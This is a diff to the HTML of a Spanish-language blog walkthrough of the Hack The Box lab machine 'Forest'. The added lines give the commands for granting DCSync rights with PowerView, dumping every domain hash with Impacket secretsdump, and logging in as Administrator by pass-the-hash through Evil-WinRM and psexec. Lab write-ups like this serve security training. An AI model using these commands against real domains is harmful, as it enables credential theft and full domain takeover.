@@ -359,7 +359,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload SharpHound.ps1
 </code></pre></div></div>
 
-<p>Una vez subido, importaremos y utilizaremos el método <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> para recolectar toda la información necesaria.</p>
+<p>Una vez subido, importaremos y utilizaremos la función <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> para recolectar toda la información necesaria.</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpHound.ps1</span><span class="w">
 </span><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w">
@@ -429,21 +429,41 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/27.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Finalmente, para otorgarnos permisos de <code class="language-plaintext highlighter-rouge">DCsync</code>, podemos apoyarnos en <code class="language-plaintext highlighter-rouge">BloodHound</code>, que nos da una idea de cómo realizarlo.</p>
-
-<p>Lo primero que haremos será descargar en nuestro equipo el script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, que pertenece a PowerSploit (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante Evil-WinRM y posteriormente lo importaremos:</p>
+<p>Finalmente, para otorgarnos permisos de <code class="language-plaintext highlighter-rouge">DCsync</code>, podemos apoyarnos en <code class="language-plaintext highlighter-rouge">BloodHound</code>, que nos da una idea de cómo realizarlo. Lo primero que haremos será descargar en nuestro equipo el script <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, que pertenece a <code class="language-plaintext highlighter-rouge">PowerSploit</code> (una colección de scripts en PowerShell). Igual que antes, lo subiremos mediante <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> y posteriormente lo importaremos:</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/28.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/29.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">upload</span><span class="w"> </span><span class="nx">PowerView.ps1</span><span class="w">
+</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
+</span></code></pre></div></div>
+
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/30.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<p>Una vez importado, utilizaremos la función <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> para otorgar permisos de <code class="language-plaintext highlighter-rouge">DCsync</code> a nuestro usuario recién creado:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl <span class="nt">-TargetIdentity</span> <span class="s2">"DC=htb,DC=local"</span> <span class="nt">-PrincipalIdentity</span> nombreDeUsuario <span class="nt">-Rights</span> DCSync
+</code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/31.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
+<p>Ya con permisos de <code class="language-plaintext highlighter-rouge">DCsync</code> en nuestro usuario, podemos utilizar <code class="language-plaintext highlighter-rouge">secretsdump</code>, otro script de la suite de <code class="language-plaintext highlighter-rouge">Impacket</code> que nos permitirá dumpear los hashes de todos los usuarios del dominio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump htb.local/nombreUsuario:contraseña@10.10.10.161
+</code></pre></div></div>
+
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/32.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
+<p>Finalmente, podemos realizar un ataque de tipo <code class="language-plaintext highlighter-rouge">Pass the Hash</code>, que consiste en usar el <em>hash</em> que acabamos de conseguir en lugar de la contraseña (que no conocemos) para autenticarnos. Para esto, podríamos utilizar <code class="language-plaintext highlighter-rouge">psexec</code> (otro script de <code class="language-plaintext highlighter-rouge">Impacket</code>), o bien, mediante el mismo <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'HASH'</span>
+</code></pre></div></div>
+
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/33.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec administrator@10.10.10.161 <span class="nt">-hash</span> HASH
+</code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-07-08-Forest-Hack-The-Box/34.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
 
